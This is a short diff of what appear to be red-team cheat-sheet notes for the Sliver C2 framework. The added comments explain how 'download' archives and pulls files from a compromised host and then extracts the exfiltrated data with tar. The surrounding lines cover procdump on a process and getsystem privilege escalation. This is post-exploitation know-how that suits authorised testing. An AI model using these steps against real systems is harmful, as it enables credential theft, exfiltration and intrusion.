@@ -97,7 +97,11 @@ ps
 procdump -p <PID>
 // Upload and Download - use absolute path
 upload
+// Download to the directory executed sliver-server/client
+// tar.gz recursively on a directory by default <feels good> 
 download
+// extract after downloading
+// tar -xf $exfil
 
 // With Administrative and adble to get SeDebugPrivilege - by default uses spool.svc to getsystem 
 getsystem
